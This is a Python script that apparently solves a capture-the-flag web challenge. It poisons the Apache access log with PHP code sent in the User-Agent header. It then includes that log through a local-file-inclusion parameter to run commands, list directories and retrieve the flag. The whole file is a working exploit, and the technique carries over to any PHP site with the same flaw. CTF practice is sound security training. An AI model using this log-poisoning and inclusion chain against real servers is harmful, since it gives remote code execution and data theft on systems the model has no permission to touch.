import requests
import re

_url_base = 'https://poison-for-tomorrow.secchallenge.crysys.hu'


def solve():
    files = _get_remote_dir('.')
    dir_name = re.search('very_secret.*', files).group()
    assert('flag' in _get_remote_dir(dir_name).split('\n'))
    flag = requests.get(f'{_url_base}/{dir_name}/flag').text
    return flag


def _get_remote_dir(folder):
    return _rce(f'foreach (scandir("{folder}") as $x) echo $x."\\n";')


def _rce(cmd):
    headers = {
        'User-Agent': f'<?php echo "qqqqq"; {cmd} echo "qqqqq\\n";?>',
    }
    st = f'{_url_base}/index.php?page=/var/log/apache2/access.log'

    rsp = requests.post(st, headers=headers).text
    return re.search('qqqqq(.*)qqqqq', rsp, re.DOTALL).group(1)


if __name__ == "__main__":
    print(solve())
